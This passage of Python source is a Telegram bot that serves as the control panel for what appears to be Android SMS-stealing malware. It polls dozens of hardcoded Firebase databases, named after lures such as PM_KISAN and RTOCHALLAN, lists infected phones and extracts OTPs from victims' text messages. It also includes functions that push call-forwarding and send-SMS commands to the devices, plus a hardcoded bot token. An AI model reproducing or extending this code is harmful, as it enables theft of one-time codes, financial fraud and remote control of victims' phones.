   "KINGBGGBB": "https://kingbggbb-default-rtdb.firebaseio.com",
   "KUMU_F2257": "https://kumu-f2257-default-rtdb.firebaseio.com",
   "LOVEFIMUS": "https://lovefimus-default-rtdb.firebaseio.com",
   "M74946448_80A23": "https://m74946448-80a23-default-rtdb.firebaseio.com",
   "M05960864_6140E": "https://m05960864-6140e-default-rtdb.firebaseio.com",
   "M93374762_8C0F6": "https://m93374762-8c0f6-default-rtdb.firebaseio.com",
   "M90910540_A4E00": "https://m90910540-a4e00-default-rtdb.firebaseio.com",
   "M631835370_CFDC7": "https://m631835370-cfdc7-default-rtdb.firebaseio.com",
   "MASTER80221_753FB": "https://master80221-753fb-default-rtdb.firebaseio.com",
   "MASTER89812_B77A6": "https://master89812-b77a6-default-rtdb.firebaseio.com",
   "MKADMIN_13DD5": "https://mkadmin-13dd5-default-rtdb.firebaseio.com",
   "MYADMIN_38635": "https://myadmin-38635-default-rtdb.firebaseio.com",
   "PANEL_WALA_V16": "https://panel-wala-v16-default-rtdb.firebaseio.com",
   "PANEL_WALA_V28": "https://panel-wala-v28-default-rtdb.firebaseio.com",
   "PANEL123628": "https://panel123628-default-rtdb.firebaseio.com",
   "PAWANKUMAR92342038_8F702": "https://pawankumar92342038-8f702-default-rtdb.firebaseio.com",
   "PM_KISAN_111": "https://pm-kisan-111-default-rtdb.firebaseio.com",
   "PMSJDJ": "https://pmsjdj-default-rtdb.firebaseio.com",
   "PRIYAKNN_3E914": "https://priyaknn-3e914-default-rtdb.firebaseio.com",
   "PROJECT_X_50AB7": "https://project-x-50ab7-default-rtdb.firebaseio.com",
   "R62710898_39A8E": "https://r62710898-39a8e-default-rtdb.firebaseio.com",
   "RAHU80759_AC69B": "https://rahu80759-ac69b-default-rtdb.firebaseio.com",
   "RAJA252525RAJ_4EE9A": "https://raja252525raj-4ee9a-default-rtdb.firebaseio.com",
   "RAJKUMAR8822556644_407F5": "https://rajkumar8822556644-407f5-default-rtdb.firebaseio.com",
   "RANDI_RONA_81876": "https://randi-rona-81876-default-rtdb.firebaseio.com",
   "RANTAISHITA_F7614": "https://rantaishita-f7614-default-rtdb.firebaseio.com",
   "RAVIKUMAR7788CCN_11C83": "https://ravikumar7788ccn-11c83-default-rtdb.firebaseio.com",
   "REXXX_4C7A7": "https://rexxx-4c7a7-default-rtdb.firebaseio.com",
   "RTO3_53DC7": "https://rto3-53dc7-default-rtdb.firebaseio.com",
   "RTO9_D2B33": "https://rto9-d2b33-default-rtdb.firebaseio.com",
   "RTOCHALLAN_8579D": "https://rtochallan-8579d-default-rtdb.firebaseio.com",
   "RTOCHALLAN8": "https://rtochallan8-default-rtdb.firebaseio.com",
   "RTOMATRIX_C1E78": "https://rtomatrix-c1e78-default-rtdb.firebaseio.com",
   "S85138920_87594": "https://s85138920-87594-default-rtdb.firebaseio.com",
   "RUPARAMEE_14F4B": "https://ruparamee-14f4b-default-rtdb.firebaseio.com",
   "SALASALI6990_1171D": "https://salasali6990-1171d-default-rtdb.firebaseio.com",
   "SEP12_AEA6D": "https://sep12-aea6d-default-rtdb.firebaseio.com",
   "SERVER_23_D1605": "https://server-23-d1605-default-rtdb.firebaseio.com",
   "SERVER_97_E23E": "https://server-97e23-default-rtdb.firebaseio.com",
   "SIKAPRO13UAGTWO": "https://sikapro13uagtwo-default-rtdb.firebaseio.com",
   "SIWANIKUMAR923420_2E01F": "https://siwanikumar923420-2e01f-default-rtdb.firebaseio.com",
   "STSFK30AUG": "https://stsfk30aug-default-rtdb.firebaseio.com",
   "TILLU_2": "https://tillu-2-default-rtdb.firebaseio.com",
   "TRYING_90B4B": "https://trying-90b4b-default-rtdb.firebaseio.com",
   "U13667713_DC566": "https://u13667713-dc566-default-rtdb.firebaseio.com",
   "U16714964_283EF": "https://u16714964-283ef-default-rtdb.firebaseio.com",
   "U24143844_C1B11": "https://u24143844-c1b11-default-rtdb.firebaseio.com",
   "U24153206_5EEF6": "https://u24153206-5eef6-default-rtdb.firebaseio.com",
   "U25783858_E6739": "https://u25783858-e6739-default-rtdb.firebaseio.com",
   "U40179853_987DF": "https://u40179853-987df-default-rtdb.firebaseio.com",
   "U58325342_DFFC0": "https://u58325342-dffc0-default-rtdb.firebaseio.com",
   "U25428732_91BD9": "https://u25428732-91bd9-default-rtdb.firebaseio.com",
   "U62751482_F5B46": "https://u62751482-f5b46-default-rtdb.firebaseio.com",
   "U62803313_E54BC": "https://u62803313-e54bc-default-rtdb.firebaseio.com",
   "U67583339_BF0C1": "https://u67583339-bf0c1-default-rtdb.firebaseio.com",
   "U72328193_47B68": "https://u72328193-47b68-default-rtdb.firebaseio.com",
   "U72749819_FA563": "https://u72749819-fa563-default-rtdb.firebaseio.com",
   "U75887828_B5A63": "https://u75887828-b5a63-default-rtdb.firebaseio.com",
   "U8208372_AD1D1" : "https://u8208372-ad1d1-default-rtdb.firebaseio.com",
   "YBVFGG-AA0F5"   :  "https://ybvfgg-aa0f5-default-rtdb.firebaseio.com"
}

DATABASES = dict(DEFAULT_DATABASES)

POLL_INTERVAL  = 15
SMS_LIMIT      = 10
DB_CONCURRENCY = 50
TOKEN          = "9102355745:AAGja05A9v9wAPceuUdvOGZGKYjy8mVUIrU"
BOT_USERNAME   = "@QxP_Pannel_bot"
DB_FILE        = "bot_database.json"

# ═══════════════════════════════════════════════════════
#  FORCE JOIN + REFERRAL GATE
# ═══════════════════════════════════════════════════════
# Set these from the Admin Panel at runtime.
FORCE_JOIN_ENABLED = False
# Master switch: when False every user can use the bot without access,
# only the admin panel stays restricted to admins.
GRANT_ACCESS_REQUIRED = True
# Multiple Force Join channels. Each item is:
# {"channel": "@publicchannel" or "-100...", "url": "https://t.me/..."}
FORCE_JOIN_CHANNELS: list[dict] = []
REFERRAL_ENABLED = True
REQUIRED_REFERRALS = 2

# ── OWNER / ADMIN ─────────────────────────────────────────────
# Sirf ek hi owner/admin hai. Koi "first user" admin nahi banta.
# Owner ka current username (case-insensitive match hota hai).
OWNER_USERNAME = "bedalx"
# Purane / alternate usernames bhi admin rahenge (safety ke liye).
OWNER_ALT_USERNAMES = {"ubaidullahxverse"}
# Hardcoded owner numeric ID — agar username badal jaye tab bhi admin rahega.
OWNER_HARD_ID = 6652975223
OWNER_IDS: set[int] = {OWNER_HARD_ID}
ADMIN_IDS: set[int] = {OWNER_HARD_ID}
# Sirf ye usernames admin ban sakte hain (numeric ID pehli baar /start par
# automatically resolve aur permanently save ho jati hai).
ADMIN_USERNAMES: set[str] = {OWNER_USERNAME} | OWNER_ALT_USERNAMES


def maybe_promote_admin(user) -> bool:
    """Auto-grant admin to configured usernames. Returns True if admin."""
    try:
        if user is None:
            return False
        uid = user.id
        uname = (user.username or "").lower()
        if uname and uname in ADMIN_USERNAMES and uid not in ADMIN_IDS:
            ADMIN_IDS.add(uid)
            OWNER_IDS.add(uid)
            save_data()
            _log(f"Owner @{uname} ({uid}) resolved and granted admin")
        return uid in ADMIN_IDS
    except Exception:
        return False

# ═══════════════════════════════════════════════════════
#  GLOBAL STATE
# ═══════════════════════════════════════════════════════

seen_ids: set[str] = set()
# Bada limit taake trimming kam se kam ho — trim hone par purane SMS keys
# dobara "new" samajh kar OTP re-forward ho sakte hain.
MAX_SEEN_IDS = 200000
first_run: bool = True
_main_app: Optional[Application] = None
_http_session: Optional[aiohttp.ClientSession] = None

all_users: dict[int, dict] = {}


class _PendingDict(dict):
    """Debug: har mutation log karta hai — pending_action kahan se udta hai,
    iska exact pata chalega (PID + stack ke saath)."""

    def _trace(self, op: str, key, with_stack: bool = False) -> None:
        try:
            msg = f"PENDING {op} pid={os.getpid()} key={key} dict={dict(self)}"
            if with_stack:
                import traceback as _tb
                msg += "\n" + "".join(_tb.format_stack(limit=6)[:-1])
            tlog(msg)
        except Exception:
            pass

    def __setitem__(self, key, value):
        super().__setitem__(key, value)
        self._trace("SET", key)

    def __delitem__(self, key):
        self._trace("DEL", key, with_stack=True)
        super().__delitem__(key)

    def pop(self, key, *args):
        self._trace("POP", key, with_stack=True)
        return super().pop(key, *args)

    def clear(self):
        self._trace("CLEAR", None, with_stack=True)
        super().clear()


pending_action: dict[int, dict] = _PendingDict()
user_cooldowns: dict[int, float] = {}
chats_registry: set[int] = set()

allowed_users: set[int] = set()
ADMIN_ONLY_TAGS: set[str] = set()
user_focus: dict[int, str] = {}
user_page: dict[int, int] = {}
GLOBAL_DEVICE_CACHE: dict[str, list] = {}
pending_kw_confirm: dict[int, str] = {}   # chat_id → keyword (waiting for confirm)

# ═══════════════════════════════════════════════════════
#  ACCESS CONTROL HELPERS
# ═══════════════════════════════════════════════════════

def has_access(user_id: int) -> bool:
    if user_id in ADMIN_IDS or user_id in allowed_users:
        return True
    if REFERRAL_ENABLED and referral_count(user_id) >= max(0, int(REQUIRED_REFERRALS)):
        return True
    return False

def grant_access(user_id: int) -> None:
    allowed_users.add(user_id)
    save_data()

def revoke_access(user_id: int) -> None:
    allowed_users.discard(user_id)
    save_data()


async def _resolve_user_arg(ctx, text: str) -> Optional[int]:
    """Admin inputs ke liye: numeric ID ya @username se user ID nikalta hai.
    Pehle known users me dhundhta hai, phir Telegram se resolve karta hai."""
    raw = (text or "").strip()
    if not raw:
        return None
    try:
        return int(raw)
    except ValueError:
        pass
    handle = raw.lstrip("@").lower()
    if not re.fullmatch(r"[a-z0-9_]{3,}", handle):
        return None
    for uid, u in all_users.items():
        if (u.get("username") or "").lower() == handle:
            try:
                return int(uid)
            except (TypeError, ValueError):
                continue
    try:
        chat = await ctx.bot.get_chat("@" + handle)
        return int(chat.id)
    except Exception:
        return None


def referral_count(user_id: int) -> int:
    data = all_users.get(user_id, {})
    refs = data.get("referrals", [])
    if not isinstance(refs, list):
        return 0
    return len(set(str(x) for x in refs))


def referral_unlocked(user_id: int) -> bool:
    if user_id in ADMIN_IDS or user_id in allowed_users:
        return True
    if not REFERRAL_ENABLED:
        return True
    return referral_count(user_id) >= max(0, int(REQUIRED_REFERRALS))


def build_bot_referral_link(user_id: int) -> str:
    username = BOT_USERNAME.lstrip("@")
    return f"https://t.me/{username}?start=ref_{user_id}"


def register_referrer(user_id: int, referrer_id: Optional[int]) -> bool:
    if not referrer_id or referrer_id == user_id:
        return False
    if referrer_id not in all_users:
        return False

    udata = all_users.setdefault(user_id, {})
    existing = udata.get("referred_by")
    if existing:
        return False

    udata["referred_by"] = int(referrer_id)
    udata.setdefault("referral_qualified", False)
    save_data()
    return True


def qualify_referral(user_id: int) -> bool:
    """Count a referral only after the referred user passes the gate."""
    udata = all_users.get(user_id, {})
    if not udata.get("referred_by"):
        return False
    if udata.get("referral_qualified"):
        return False

    referrer_id = int(udata["referred_by"])
    if referrer_id == user_id or referrer_id not in all_users:
        return False

    ref_data = all_users.setdefault(referrer_id, {})
    refs = ref_data.setdefault("referrals", [])
    if not isinstance(refs, list):
        refs = []
        ref_data["referrals"] = refs

    if str(user_id) not in {str(x) for x in refs}:
        refs.append(user_id)

    udata["referral_qualified"] = True
    save_data()
    return True


def get_force_join_url(channel_data: dict) -> str:
    """Return the configured join URL for one Force Join channel."""
    if not isinstance(channel_data, dict):
        return ""

    url = str(channel_data.get("url", "") or "").strip()
    if url:
        return url

    channel = str(channel_data.get("channel", "") or "").strip()
    if channel.startswith("@"):
        return f"https://t.me/{channel[1:]}"

    return ""


def force_join_keyboard() -> InlineKeyboardMarkup:
    """Show one Join button for every configured channel plus Verify."""
    rows = []

    for index, channel_data in enumerate(FORCE_JOIN_CHANNELS, start=1):
        if not isinstance(channel_data, dict):
            continue

        channel = str(channel_data.get("channel", "") or "").strip()
        url = get_force_join_url(channel_data)

        if not channel or not url:
            continue

        label = channel if channel.startswith("@") else f"Channel {index}"
        rows.append([premium_button(
            f"Join {label}",
            emoji_id="5084613633418199991",
            fallback_emoji="📢",
            style="primary",
            url=url
        )])

    rows.append([premium_button(
        "Verify Join",
        callback_data="verify_join",
        emoji_id="4958689671950369798",
        fallback_emoji="✅",
        style="success"
    )])

    return InlineKeyboardMarkup(rows)


def referral_gate_keyboard(user_id: int) -> InlineKeyboardMarkup:
    link = build_bot_referral_link(user_id)
    rows = [
        [premium_button(
            "My Referral Link",
            callback_data="my_ref",
            emoji_id="5084613633418199991",
            fallback_emoji="🎁",
            style="primary"
        )],
        [premium_button(
            f"Referrals {referral_count(user_id)}/{max(0, int(REQUIRED_REFERRALS))}",
            callback_data="my_ref",
            emoji_id="5372849966689566579",
            fallback_emoji="👥",
            style="primary"
        )],
        [premium_button(
            "Refresh Status",
            callback_data="gate_refresh",
            emoji_id="5116414868357907335",
            fallback_emoji="🔄",
            style="primary"
        )],
    ]
    return InlineKeyboardMarkup(rows)


async def is_force_joined(bot, user_id: int) -> bool:
    """Return True only when the user has joined ALL configured channels."""
    if not FORCE_JOIN_ENABLED:
        return True

    if not FORCE_JOIN_CHANNELS:
        return True

    for channel_data in FORCE_JOIN_CHANNELS:
        if not isinstance(channel_data, dict):
            continue

        channel = str(channel_data.get("channel", "") or "").strip()
        if not channel:
            continue

        try:
            member = await bot.get_chat_member(
                chat_id=channel,
                user_id=user_id
            )
            status = str(member.status).lower()

            if status in ("creator", "administrator", "member"):
                continue

            if status == "restricted" and bool(getattr(member, "is_member", False)):
                continue

            return False
        except Exception as e:
            # ⚠️ UNREACHABLE CHANNEL PROTECTION:
            # Agar koi channel unreachable hai (bot admin nahi / galat ID /
            # channel delete ho gaya) to pehle YEHI channel saare users ko
            # hamesha ke liye lock kar deta tha — Verify kabhi pass nahi hota
            # tha. Ab us channel ko skip karte hain aur admin ko ek baar
            # warning bhejte hain taake wo usse remove kar de.
            tlog(f"Force join check failed for {channel}: {e}")
            warn_key = f"fjwarn:{channel}"
            if warn_key not in seen_ids:
                seen_ids.add(warn_key)
                try:
                    await bot.send_message(
                        OWNER_HARD_ID,
                        f"⚠️ <b>FORCE JOIN WARNING</b>\n"
                        f"━━━━━━━━━━━━━━━━━━\n"
                        f"Channel <code>{html_escape(channel)}</code> verify nahi ho pa raha:\n"
                        f"<code>{html_escape(str(e))[:200]}</code>\n\n"
                        f"Bot ko us channel ka <b>admin</b> banayein, ya channel ko "
                        f"Force Join list se <b>remove</b> karein.\n"
                        f"(Jab tak ye theek nahi hota, ye channel check skip ho raha hai — "
                        f"users lock nahi honge.)",
                        parse_mode="HTML",
                    )
                except Exception:
                    pass
            continue

    return True


async def gate_state(bot, user_id: int) -> tuple[bool, str]:
    """Return (ready, reason): ready / force_join / referrals / access."""
    if user_id in ADMIN_IDS:
        return True, "ready"

    if FORCE_JOIN_ENABLED and not await is_force_joined(bot, user_id):
        return False, "force_join"

    # Master switch OFF -> no access / referral gate at all.
    if not GRANT_ACCESS_REQUIRED:
        return True, "ready"

    # A referral becomes qualified only after this user has completed
    # the required force-join step.
    qualified_now = qualify_referral(user_id)
    if qualified_now:
        referrer_id = all_users.get(user_id, {}).get("referred_by")
        if referrer_id:
            ref_count = referral_count(int(referrer_id))
            if REFERRAL_ENABLED and ref_count == max(0, int(REQUIRED_REFERRALS)):
                try:
                    await bot.send_message(
                        int(referrer_id),
                        f"🎉 <b>Referral milestone reached!</b>\n\n"
                        f"Aapke <b>{ref_count}/{REQUIRED_REFERRALS}</b> valid referrals complete ho gaye.\n"
                        "Ab bot access unlock ho gaya.",
                        parse_mode="HTML"
                    )
                except Exception:
                    pass

    if REFERRAL_ENABLED and not referral_unlocked(user_id):
        return False, "referrals"

    return True, "ready"


async def send_gate_message(update: Update, ctx: ContextTypes.DEFAULT_TYPE, reason: str = None) -> None:
    user_id = update.effective_chat.id
    if reason is None:
        _, reason = await gate_state(ctx.bot, user_id)

    if reason == "force_join":
        channel_lines = []
        for index, channel_data in enumerate(FORCE_JOIN_CHANNELS, start=1):
            if not isinstance(channel_data, dict):
                continue
            channel = str(channel_data.get("channel", "") or "").strip()
            if channel:
                channel_lines.append(
                    f"{index}. <code>{html_escape(channel)}</code>"
                )

        channels_text = "\n".join(channel_lines) or "No channels configured."
        text = (
            f"{premium_emoji('4958526153955476488', '🔒')} <b>JOIN REQUIRED</b>\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "Bot use karne se pehle in sabhi channels ko join karein:\n\n"
            f"{channels_text}\n\n"
            "Sabhi channels join karne ke baad <b>Verify Join</b> dabayein.\n"
            "━━━━━━━━━━━━━━━━━━"
        )
        await update.message.reply_text(
            text,
            reply_markup=force_join_keyboard(),
            parse_mode="HTML"
        )
        return

    if reason == "referrals":
        count = referral_count(user_id)
        need = max(0, int(REQUIRED_REFERRALS))
        text = (
            f"{premium_emoji('5084613633418199991', '🎁')} <b>REFERRAL UNLOCK</b>\n"
            "━━━━━━━━━━━━━━━━━━\n"
            f"Bot use karne ke liye <b>{need}</b> valid referrals complete karein.\n\n"
            f"Current progress: <b>{count}/{need}</b>\n"
            "Referral tab count hoga jab referred user required join check complete karega.\n"
            "━━━━━━━━━━━━━━━━━━"
            )
        await update.message.reply_text(text, reply_markup=referral_gate_keyboard(user_id), parse_mode="HTML")
        return

    await update.message.reply_text(NO_ACCESS_TEXT, parse_mode="HTML")

# ═══════════════════════════════════════════════════════
#  DATA SAVING & LOADING
# ═══════════════════════════════════════════════════════

def save_data():
    try:
        data_to_dump = {
            "all_users": all_users,
            "DATABASES": DATABASES,
            "allowed_users": list(allowed_users),
            "admin_only_tags": list(ADMIN_ONLY_TAGS),
            "force_join_enabled": FORCE_JOIN_ENABLED,
            "grant_access_required": GRANT_ACCESS_REQUIRED,
            "force_join_channels": FORCE_JOIN_CHANNELS,
            "referral_enabled": REFERRAL_ENABLED,
            "required_referrals": REQUIRED_REFERRALS,
            "auto_db_group": AUTO_DB_GROUP,
            "auto_db_backup_group": AUTO_DB_BACKUP_GROUP,
            "auto_db_enabled": AUTO_DB_ENABLED,
            "auto_db_interval": AUTO_DB_INTERVAL,
            "maintenance_mode": MAINTENANCE_MODE,
        }
        # Rolling backup — agar kabhi data corrupt/overwrite ho jaye to recover ho sake.
        try:
            import shutil as _sh
            if os.path.exists(DB_FILE):
                _sh.copyfile(DB_FILE, DB_FILE + ".bak")
        except Exception:
            pass
        with open(DB_FILE, "w") as f:
            json.dump(data_to_dump, f, indent=4)
    except Exception as e:
        tlog(f"Save Data Error: {e}")

def load_data():
    global all_users, DATABASES, allowed_users, ADMIN_ONLY_TAGS
    global FORCE_JOIN_ENABLED, FORCE_JOIN_CHANNELS, REFERRAL_ENABLED, REQUIRED_REFERRALS
    global GRANT_ACCESS_REQUIRED
    global AUTO_DB_GROUP, AUTO_DB_BACKUP_GROUP, AUTO_DB_ENABLED, AUTO_DB_INTERVAL, MAINTENANCE_MODE
    DATABASES = dict(DEFAULT_DATABASES)
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, "r") as f:
                data = json.load(f)
                loaded_users = data.get("all_users", {})
                for k, v in loaded_users.items():
                    all_users[int(k)] = v
                saved_dbs = data.get("DATABASES", {})
                if saved_dbs:
                    merged = dict(DEFAULT_DATABASES)
                    merged.update(saved_dbs)
                    # ⛔ AUTO-REMOVE DISABLED: pehle yahan do tags har startup par
                    # zabardasti delete ho jate the. Ab koi DB kabhi khud se
                    # nahi udte — sirf admin manually Panel Manager se hata sakta hai.
                    DATABASES = merged
                saved_allowed = data.get("allowed_users", [])
                allowed_users = set(int(u) for u in saved_allowed)
                ADMIN_ONLY_TAGS = set(data.get("admin_only_tags", []))
                FORCE_JOIN_ENABLED = bool(data.get("force_join_enabled", FORCE_JOIN_ENABLED))
                GRANT_ACCESS_REQUIRED = bool(data.get("grant_access_required", GRANT_ACCESS_REQUIRED))

                saved_force_channels = data.get("force_join_channels")
                FORCE_JOIN_CHANNELS = []

                if isinstance(saved_force_channels, list):
                    for item in saved_force_channels:
                        if not isinstance(item, dict):
                            continue
                        channel = str(item.get("channel", "") or "").strip()
                        url = str(item.get("url", "") or "").strip()
                        if channel:
                            FORCE_JOIN_CHANNELS.append({
                                "channel": channel,
                                "url": url
                            })
                else:
                    # Backward compatibility with the old single-channel JSON format.
                    old_channel = str(data.get("force_join_channel", "") or "").strip()
                    old_url = str(data.get("force_join_url", "") or "").strip()
                    if old_channel:
                        FORCE_JOIN_CHANNELS.append({
                            "channel": old_channel,
                            "url": old_url
                        })
                REFERRAL_ENABLED = bool(data.get("referral_enabled", REFERRAL_ENABLED))
                try:
                    REQUIRED_REFERRALS = max(0, int(data.get("required_referrals", REQUIRED_REFERRALS)))
                except Exception:
                    REQUIRED_REFERRALS = 2
                try:
                    AUTO_DB_GROUP = int(data.get("auto_db_group", 0) or 0)
                except Exception:
                    AUTO_DB_GROUP = 0
                try:
                    AUTO_DB_BACKUP_GROUP = int(data.get("auto_db_backup_group", 0) or 0)
                except Exception:
                    AUTO_DB_BACKUP_GROUP = 0
                AUTO_DB_ENABLED = bool(data.get("auto_db_enabled", False))
                try:
                    AUTO_DB_INTERVAL = max(10, int(data.get("auto_db_interval", 30)))
                except Exception:
                    AUTO_DB_INTERVAL = 30
                MAINTENANCE_MODE = bool(data.get("maintenance_mode", False))
        except Exception as e:
            tlog(f"Load Data Error: {e}")

async def auto_save_loop():
    while True:
        await asyncio.sleep(60)
        save_data()

# ═══════════════════════════════════════════════════════
#  ANTI-SPAM
# ═══════════════════════════════════════════════════════

def is_spamming(user_id: int) -> bool:
    if user_id in ADMIN_IDS:
        return False
    now = time.time()
    last_click = user_cooldowns.get(user_id, 0)
    if now - last_click < 0.5:
        return True
    user_cooldowns[user_id] = now
    return False

def tlog(msg: str) -> None:
    t = datetime.now().strftime("%I:%M:%S %p")
    print(f"[{t}]  {msg}", flush=True)

# ═══════════════════════════════════════════════════════
#  FIREBASE HELPERS
# ═══════════════════════════════════════════════════════

_FB_TIMEOUT = aiohttp.ClientTimeout(total=4, connect=2)

async def _get_session() -> aiohttp.ClientSession:
    global _http_session
    if _http_session is None or _http_session.closed:
        connector = aiohttp.TCPConnector(limit=100, ttl_dns_cache=300, keepalive_timeout=30)
        _http_session = aiohttp.ClientSession(connector=connector, timeout=_FB_TIMEOUT)
    return _http_session

async def fb_get(path: str, base: str) -> Optional[dict]:
    try:
        session = await _get_session()
        url = f"{base}/{path}.json" if path else f"{base}/.json"
        async with session.get(url) as r:
            if r.status != 200: return None
            data = await r.json(content_type=None)
            return data if isinstance(data, dict) else None
    except Exception:
        return None

async def fb_keys(path: str, base: str) -> list[str]:
    try:
        session = await _get_session()
        url = f"{base}/{path}.json?shallow=true" if path else f"{base}/.json?shallow=true"
        async with session.get(url) as r:
            if r.status != 200: return []
            data = await r.json(content_type=None)
            return list(data.keys()) if isinstance(data, dict) else []
    except Exception:
        return []

async def fb_patch(path: str, payload: dict, base: str) -> bool:
    try:
        session = await _get_session()
        async with session.patch(f"{base}/{path}.json", json=payload) as r:
            return r.status == 200
    except Exception:
        return False

# ═══════════════════════════════════════════════════════
#  UTILITY FUNCTIONS
# ═══════════════════════════════════════════════════════

def html_escape(text: str) -> str:
    return text.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

def fmt_num(n: str) -> str:
    c = re.sub(r"\D", "", n)
    if c.startswith("91") and len(c) == 12: return f"+{c}"
    if len(c) == 10: return f"+91{c}"
    if len(c) > 4: return f"+{c}"
    return c

OTP_PATTERNS = [
    re.compile(r"OTP[^\d]*(\d{4,8})",        re.IGNORECASE),
    re.compile(r"code[^\d]*(\d{4,8})",       re.IGNORECASE),
    re.compile(r"password[^\d]*(\d{4,8})",   re.IGNORECASE),
    re.compile(r"\b(\d{6})\b"),
    re.compile(r"\b(\d{4})\b"),
]

def extract_otp(text: str) -> Optional[str]:
    for pat in OTP_PATTERNS:
        m = pat.search(text)
        if m: return m.group(1)
    return None

def parse_battery(val) -> int:
    if isinstance(val, (int, float)): return int(val)
    if isinstance(val, str):
        digits = re.sub(r"\D", "", val)
        return int(digits) if digits else 0
    return 0

def parse_status_str(val) -> str:
    if not val: return "offline"
    return "online" if str(val).lower() == "online" else "offline"

def parse_status_bool(val) -> str:
    return "online" if val is True else "offline"

def sms_date(sms: dict) -> str:
    date_str = sms.get("date") or sms.get("receivedDate") or sms.get("recivedDate")
    if date_str: return date_str
    if sms.get("timestamp"):
        try:
            ts = float(sms["timestamp"])
            if ts > 1e11: ts /= 1000
            return datetime.fromtimestamp(ts).strftime("%d %b %Y %I:%M %p")
        except: pass
    return "N/A"

def seen_key(device_id: str, k: str) -> str:
    return f"{device_id}/{k}"

async def write_call_forward(device, forward_to: str) -> bool:
    if device.sms_path.endswith("receivedSms"):
        payload = {"callForwardingEnabled": True, "forwardToNumber": forward_to, "simSlotIndex": 0}
        ok = await fb_patch(f"{device.id}/callForwarding", payload, device.base_url)
    else:
        payload = {"callForward": forward_to, "timestamp": int(time.time() * 1000), "status": "pending"}
        ok = await fb_patch(f"device_commands/{device.id}", payload, device.base_url)
    return ok

async def write_send_sms(device, to: str, body: str) -> bool:
    if device.sms_path.endswith("receivedSms"):
        payload = {"message": body, "targetNumber": to, "simSlot": 0}
        ok = await fb_patch(f"{device.id}/sendSms", payload, device.base_url)
    else:
        payload = {"sendSms": {"to": to, "body": body}, "timestamp": int(time.time() * 1000), "status": "pending"}
        ok = await fb_patch(f"device_commands/{device.id}", payload, device.base_url)
    return ok

# ═══════════════════════════════════════════════════════
#  DATA CLASSES & ASYNC FIREBASE ENGINE
# ═══════════════════════════════════════════════════════

PAGE_SIZE = 2000

class Device:
    __slots__ = (
        "id", "name", "status", "battery", "timestamp",
        "numbers", "device_info", "sms_path", "base_url", "db_tag"
    )
    def __init__(self, id, name, status, battery, timestamp, numbers, device_info, sms_path, base_url, db_tag):
        self.id = id; self.name = name; self.status = status
        self.battery = battery; self.timestamp = timestamp; self.numbers = numbers
        self.device_info = device_info; self.sms_path = sms_path
        self.base_url = base_url; self.db_tag = db_tag

async def fetch_db_data(tag: str, url: str) -> list[Device]:
    devices_list = []
    added_set = set()
    try:
        root_keys, sim_all, device_info_all, user_data_all, clients_all = await asyncio.gather(
            fb_keys("", url),
            fb_get("All_Users/simDetails", url),
            fb_get("All_Users/Data/DeviceInfo", url),
            fb_get("user_data", url),
            fb_get("clients", url),
        )
        if sim_all and isinstance(sim_all, dict):
            info_all = device_info_all or {}
            for dev_id, sim in sim_all.items():
                if dev_id in added_set: continue
                added_set.add(dev_id)
                info = info_all.get(dev_id) or {}
                nums = []
                for field in ("sim1Number", "sim2Number"):
                    n = (sim or {}).get(field, "")
                    if n and len(re.sub(r"\D", "", str(n))) > 4: nums.append(fmt_num(str(n)))
                model = info.get("DeviceModel") or info.get("Brand") or f"Device-{dev_id[:6]}"
                devices_list.append(Device(
                    id=dev_id, name=model, status=parse_status_str(info.get("Status")),
                    battery=parse_battery(info.get("Battery")), timestamp=int(info.get("currentTimeMillis") or 0),
                    numbers=nums, device_info=f"Model: {model}\nBrand: {info.get('Brand','')}\nDevice ID: {dev_id}",
                    sms_path=f"All_Users/sms/{dev_id}", base_url=url, db_tag=tag
                ))
        if user_data_all and isinstance(user_data_all, dict):
            for dev_id, data in user_data_all.items():
                if dev_id in added_set or not isinstance(data, dict): continue
                added_set.add(dev_id)
                nums = []
                for field in ("numberSim1", "numberSim2", "mobNo"):
                    n = data.get(field, "")
                    if n and len(re.sub(r"\D", "", str(n))) > 4: nums.append(fmt_num(str(n)))
                devices_list.append(Device(
                    id=dev_id, name=data.get("d_name") or f"Device-{dev_id[:6]}",
                    status=parse_status_str(data.get("status")), battery=parse_battery(data.get("battery")),
                    timestamp=int(data.get("timestamp") or 0), numbers=nums,
                    device_info=data.get("Device_info") or f"Device ID: {dev_id}",
                    sms_path=f"user_sms/{dev_id}", base_url=url, db_tag=tag
                ))
        if clients_all and isinstance(clients_all, dict):
            for dev_id, client in clients_all.items():
                if dev_id in added_set or not isinstance(client, dict): continue
                nums = []
                mob = client.get("mobNo") or ""
                if mob and len(re.sub(r"\D", "", mob)) > 5: nums.append(fmt_num(mob))
                elif client.get("sims") and isinstance(client["sims"], list) and client["sims"]:
                    ph = (client["sims"][0] or {}).get("phoneNumber") or ""
                    if ph and len(re.sub(r"\D", "", ph)) > 5: nums.append(fmt_num(ph))
                if not nums and not client.get("modelName"): continue
                added_set.add(dev_id)
                model = client.get("modelName") or f"Device-{dev_id[:6]}"
                devices_list.append(Device(
                    id=dev_id, name=model, status=parse_status_bool(client.get("status")),
                    battery=parse_battery(client.get("battery")), timestamp=0, numbers=nums,
                    device_info=f"Model: {model}\nDevice ID: {dev_id}",
                    sms_path=f"All_Users/sms/{dev_id}", base_url=url, db_tag=tag
                ))
        if root_keys:
            type4_keys = [k for k in root_keys if len(k) == 16 and re.match(r"^[0-9a-fA-F]+$", k)]
            if type4_keys:
                async def fetch_t4(k):
                    return k, await fb_get(f"{k}/deviceInfo", url), await fb_get(f"{k}/simInfo", url), await fb_get(f"{k}/heartbeat", url)
                t4results = await asyncio.gather(*(fetch_t4(k) for k in type4_keys))
                for k, info, sim, hb in t4results:
                    if not isinstance(info, dict) or k in added_set: continue
                    added_set.add(k)
                    nums = []
                    if isinstance(sim, dict):
                        for sim_v in sim.values():
                            if isinstance(sim_v, dict):
                                n = sim_v.get("number", "")
                                if n and len(re.sub(r"\D", "", n)) > 4: nums.append(fmt_num(n))
                    model = info.get("model") or info.get("brand") or f"Device-{k[:6]}"
                    ts = int(hb) if isinstance(hb, (int, float)) else 0
                    status = "online" if ts and (time.time() * 1000 - ts) < 300000 else "offline"
                    devices_list.append(Device(
                        id=k, name=model, status=status, battery=0, timestamp=ts, numbers=nums,
                        device_info=f"Model: {model}\nDevice ID: {k}", sms_path=f"{k}/receivedSms", base_url=url, db_tag=tag
                    ))
    except Exception:
        pass
    return devices_list

async def get_all_devices(is_admin: bool = True) -> list[Device]:
    devices = []
    for tag in DATABASES.keys():
